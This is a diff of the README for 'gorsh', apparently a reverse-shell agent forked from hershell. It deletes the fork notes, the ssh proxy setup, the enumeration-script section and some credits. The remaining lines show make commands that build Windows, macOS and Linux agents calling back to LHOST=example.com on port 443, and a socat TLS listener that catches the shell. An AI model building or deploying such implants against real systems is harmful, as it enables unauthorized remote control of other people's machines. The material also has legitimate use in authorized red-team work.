@@ -11,16 +11,9 @@
 ![](https://i.imgur.com/x51XH6K.png)
 [![asciicast](https://asciinema.org/a/NmeC42TNu8BgdjMLcyVUXo74x.svg)](https://asciinema.org/a/NmeC42TNu8BgdjMLcyVUXo74x)
 
-Originally forked from - [sysdream/hershell](https://github.com/sysdream/hershell)
 
-## Fork Changes
-
-**Requires go1.16+**
-
-See the [Changelog](./docs/CHANGELOG.md)
 
 ## Getting started
-
 ```bash
 git clone git@github.com:audibleblink/gorsh.git
 ```
@@ -31,26 +24,12 @@ Make sure you're familiar with cross-compilation and cgo and have the toolchains
 
 ### Usage
 
-**Create** `internal/sshocks/conf/ssh.json`. There's an example in that same directory for
-reference.
-
-Follow the make command's printed instructions on creating an ssh user for the reverse proxy
-connection.
-
 Generate agents with:
 
 ```bash
 # For the `make` targets, you only need the`LHOST`and`LPORT`environment variables.
 $ make {windows,macos,linux} LHOST=example.com LPORT=443
 ```
-
-#### Enumeration Scripts
-
-The `enum` command will present a selection dialog that allows once to run enumeration scripts based
-on the host OS. You can update scripts in `scripts/prepare_enum_scripts.sh` and run 
-`make enumscripts`. Addition of scripts will require modification of
-`./internal/enum/enum_{windows,linux}.go`
-
 
 #### Catching the shell
 
@@ -102,6 +81,4 @@ $ socat stdio OPENSSL-LISTEN:443,cert=server.pem,key=server.key,verify=0
 ## Credits
 
 * Initial Work - [@lesnuages](https://github.com/lesnuages)
-* Modifications - f47h3r - [@f47h3r_b0](https://twitter.com/f47h3r_b0)
 * [@mzpqnxow](https://github.com/mzpqnxow) for figuring out my x-compilation and dependancy problems and troubleshooting guide
-* Enumeration scripts courtesy of [@411hall](https://twitter.com/411hall) [@harmj0y](https://twitter.com/harmj0y) [@rebootuser](https://twitter.com/rebootuser)
